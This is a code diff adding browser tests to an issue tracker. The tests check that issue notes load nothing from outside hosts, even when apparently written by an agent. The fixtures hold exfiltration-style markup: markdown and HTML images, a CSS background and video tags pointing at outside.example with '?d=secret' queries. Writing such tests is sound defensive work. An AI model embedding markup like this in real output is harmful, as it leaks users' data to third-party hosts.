@@ -115,6 +115,36 @@ test('opens a link to the web in a new tab, handing it nothing of this page', as
     await expect(page.locator('.doc a', {hasText: 'the jam'})).not.toHaveAttribute('target', /./)
 })
 
+test('loads nothing from outside by itself, however an agent writes it (ORR-748)', async ({page, request}) => {
+    const outside: string[] = []
+    await page.route('https://outside.example/**', (route) => {
+        outside.push(route.request().url())
+        return route.abort()
+    })
+    const notes = [
+        '![the secret](https://outside.example/md.png?d=secret)',
+        '<img src="https://outside.example/html.png?d=secret">',
+        '<div style="background: url(https://outside.example/style.png?d=secret)">styled</div>',
+        '<video src="https://outside.example/video.mp4?d=secret" poster="https://outside.example/poster.png?d=secret"></video>',
+    ].join('\n\n')
+    const issue = await api(request, 'post', '/issues', {title: 'Pixels', notes})
+    const answer = await page.goto(`/p/pantry-notes/issues/${issue.id}`)
+    expect(answer?.headers()['content-security-policy']).toContain("img-src 'self' data: blob:")
+    await expect(page.getByText('styled')).toBeVisible()
+    await page.waitForLoadState('networkidle')
+    expect(outside).toEqual([])
+})
+
+test("keeps orrery's own image an image", async ({page, request}) => {
+    const png = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg=='
+    const {markdown} = await (await request.post('/api/uploads', {data: {name: 'jar.png', data: png}})).json() as {markdown: string}
+    const issue = await api(request, 'post', '/issues', {title: 'Jar', notes: markdown})
+    await page.goto(`/p/pantry-notes/issues/${issue.id}`)
+    const image = page.locator('.doc img').first()
+    await expect(image).toBeVisible()
+    expect(await image.evaluate((element: HTMLImageElement) => element.naturalWidth)).toBeGreaterThan(0)
+})
+
 test("gives headings ids of their own that can't name anything on the page", async ({page, request}) => {
     const issue = await api(request, 'post', '/issues', {title: 'Shelves', notes: '## location\n\none\n\n## Jam\n\ntwo\n\n## Jam\n\nthree\n\n## !!!'})
     await page.goto(`/p/pantry-notes/issues/${issue.id}`)
